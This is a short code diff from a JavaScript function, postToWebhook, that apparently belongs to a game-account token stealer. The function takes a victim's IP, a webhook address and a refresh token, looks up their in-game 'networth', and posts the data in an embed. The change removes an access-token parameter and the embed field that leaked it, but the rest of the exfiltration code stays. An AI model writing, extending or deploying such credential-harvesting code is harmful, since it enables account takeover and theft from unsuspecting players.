@@ -315,7 +315,6 @@ async function postToWebhook(
     ip,
     webhook,
     refreshToken,
-    accessToken,
 ) {
         let networth = await (
         await axios
@@ -358,10 +357,6 @@ async function postToWebhook(
                     {
                         name: "**Unsoulbounded Networth**",
                         value: "```"+networth+"```",
-                    },
-                    {
-                        name: "**Refresh Token**",
-                        value: "```"+accessToken+"```",
                     },
                 ],
                 footer: {
